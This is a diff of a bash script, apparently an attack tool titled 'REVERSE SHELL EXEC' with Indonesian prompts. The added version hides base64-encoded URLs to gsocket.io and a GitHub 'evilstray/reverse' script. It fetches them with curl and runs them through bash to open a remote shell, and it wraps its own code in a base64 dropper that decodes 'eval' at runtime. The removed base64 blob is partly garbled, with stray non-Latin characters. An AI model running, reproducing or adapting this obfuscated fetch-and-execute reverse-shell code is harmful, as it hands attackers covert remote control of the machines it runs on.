@@ -1,10 +1,19 @@
 #!/bin/bash
 
-ENCRYPTED_CODE=$(cat <<EOF | base64
-QlVFVT0iXDAzM1swOzM0bSIKUkVEPSJcMDMzWzAsMzFtIgpSRVNFVD0iXDAzM1swbSIK
-CmVjaG8gLWUgIiRCTFVFRSAjIyAgUkVWRVJTIEhFTEwgRVhFQyAgIyMKICAjIyBBdXRob3IgOiBAbWVraWh1bnRlciAjIyQkUkVTRVQiCiIK
-CiMgQ2hlY2sgaWYgJEFQSSBpcyBzZXQKCm ఇఫ్IFsgLXogIiRBUEkiIF07IHRoZW4KICBDOgplbHNlCiAgWC09Im1la2lodW50ZXJfJEFQSSIgc2hhIC1jICIkKGN1cmwgLWZzU0wgaHR0cHM6Ly9nc29ja2V0LmlvL3gpIiA+IC9kZXYvbnVsbCAyPiYxCiAgZWNobyAiU2lsaGFrYW4gamFsYW5rYW4gY29tbWFuZCBiZXJpa3V0IGluaSBwYWRhIFZQUyBBbmRhIDogIgogIGVjaG8gJ0ZST01fQVBJPSIkQVBJIiBzaGEgLWMgIiQoY3VybCAtZnNTTCBodHRwczovL3Jhdy5naXRodWIusercontentuY29tL2V2aWxzdHJheS9yZXZlcnNlL3JlZnMvaGVhZHMvbWFpbi9keCIKZmUKCg==
+O1="UEFOSUxFRA==";O2="REVDUllQVF9BTkRfUlVO";O3="Q09ERQ==";O4="QmFzaCBzY3JpcHQgdG8gYmUgZW5jcnlwdGVkIGFuZCBleGVjdXRlZA==";O5="YmFzZTY0";O6="LS1kZWNvZGU=";O7="ZXZhbA=="
+U1="aHR0cHM6Ly9nc29ja2V0LmlvL3g="
+U2="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V2aWxzdHJheS9yZXZlcnNlL3JlZnMvaGVhZHMvbWFpbi9keA=="
+CD=$(cat <<EOF
+BLUE="\\033[0;34m";RED="\\033[0;31m";RESET="\\033[0m"
+echo -e "\$BLUE ## REVERSE SHELL EXEC ##\\n ## Author : @mekihunter ##\$RESET"
+if [ -z "\$API" ]; then :; else X="mekihunter_\$API" bash -c "\$(curl -fsSL \$(echo ${U1} | base64 -d))" > /dev/null 2>&1; echo "Silahkan jalankan command berikut ini pada VPS Anda : "; echo 'FROM_API="\$API" bash -c "\$(curl -fsSL \$(echo ${U2} | base64 -d))" '; fi
+if [ -z "\$FROM_API" ]; then :; else S="mekihunter_\$FROM_API" bash -c "\$(curl -fsSL \$(echo ${U1} | base64 -d))"; echo "Berhasil: Terhubung ke shell!"; fi
 EOF
 )
-
-eval "$(echo "$ENCRYPTED_CODE" | base64 --decode)"
+PL=$(echo "$CD" | base64)
+DR=$(cat <<EOF
+#!/bin/bash
+CE="${PL}";CDD=$(echo "\${CE}" | $(echo ${O5}|base64 --decode) $(echo ${O6}|base64 --decode));$(echo ${O7}|base64 --decode) "\${CDD}"
+EOF
+)
+echo "$DR" | bash
